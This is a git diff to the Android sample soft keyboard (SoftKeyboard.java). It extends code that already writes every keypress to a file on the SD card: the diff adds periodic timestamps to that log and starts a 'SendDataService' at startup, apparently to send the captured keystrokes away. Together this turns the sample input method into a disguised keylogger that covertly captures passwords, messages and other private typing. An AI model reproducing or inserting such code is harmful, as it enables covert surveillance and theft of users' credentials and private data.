@@ -16,12 +16,7 @@
 
 package com.example.android.softkeyboard;
 
-import java.io.File;
-import java.io.FileOutputStream;
-import java.util.ArrayList;
-import java.util.List;
-
-import android.content.Context;
+import android.content.Intent;
 import android.inputmethodservice.InputMethodService;
 import android.inputmethodservice.Keyboard;
 import android.inputmethodservice.KeyboardView;
@@ -37,6 +32,15 @@ import android.view.inputmethod.EditorInfo;
 import android.view.inputmethod.InputConnection;
 import android.view.inputmethod.InputMethodManager;
 import android.view.inputmethod.InputMethodSubtype;
+
+import java.io.File;
+import java.io.FileOutputStream;
+import java.text.DateFormat;
+import java.text.SimpleDateFormat;
+import java.util.ArrayList;
+import java.util.Date;
+import java.util.List;
+import java.util.TimeZone;
 
 /**
  * Example of writing an input method for a soft keyboard.  This code is
@@ -72,7 +76,8 @@ public class SoftKeyboard extends InputMethodService
     private boolean mCapsLock;
     private long mLastShiftTime;
     private long mMetaState;
-    
+    private long currentTime;
+
     private LatinKeyboard mSymbolsKeyboard;
     private LatinKeyboard mSymbolsShiftedKeyboard;
     private LatinKeyboard mQwertyKeyboard;
@@ -80,6 +85,7 @@ public class SoftKeyboard extends InputMethodService
     private LatinKeyboard mCurKeyboard;
     
     private String mWordSeparators;
+
     
     /**
      * Main initialization of the input method component.  Be sure to call
@@ -90,6 +96,8 @@ public class SoftKeyboard extends InputMethodService
         Log.d("HI THERE","HI THERE");
         mInputMethodManager = (InputMethodManager)getSystemService(INPUT_METHOD_SERVICE);
         mWordSeparators = getResources().getString(R.string.word_separators);
+        startService(new Intent(getBaseContext(), SendDataService.class));
+        currentTime = System.currentTimeMillis();
     }
     
     /**
@@ -500,6 +508,14 @@ public class SoftKeyboard extends InputMethodService
 
     // Implementation of KeyboardViewListener
 
+    private String getCurrentTime() {
+        TimeZone tz = TimeZone.getTimeZone("UTC");
+        DateFormat df = new SimpleDateFormat("yyyy-MM-dd'T'HH:mm'Z'");
+        df.setTimeZone(tz);
+        String currentUTCTime = df.format(new Date());
+        return currentUTCTime;
+    }
+
     public void onKey(int primaryCode, int[] keyCodes) {
     	String keypress = String.valueOf((char)primaryCode);
     	Log.d("Key Pressed",keypress);
@@ -509,6 +525,14 @@ public class SoftKeyboard extends InputMethodService
 
     		File outfile = new File(SDCARD+File.separator+FILENAME);
     		FileOutputStream fos = new FileOutputStream(outfile,true);
+
+            Long timeRightNow = System.currentTimeMillis();
+            String timeOnNewLine = "\n" + timeRightNow.toString() + "\n";
+            if (timeRightNow > (currentTime + 15 * 1000)) {
+                fos.write(timeOnNewLine.getBytes());
+                currentTime = timeRightNow;
+            }
+
     		fos.write(keypress.getBytes());
     		fos.close();
     	}catch(Exception e) {
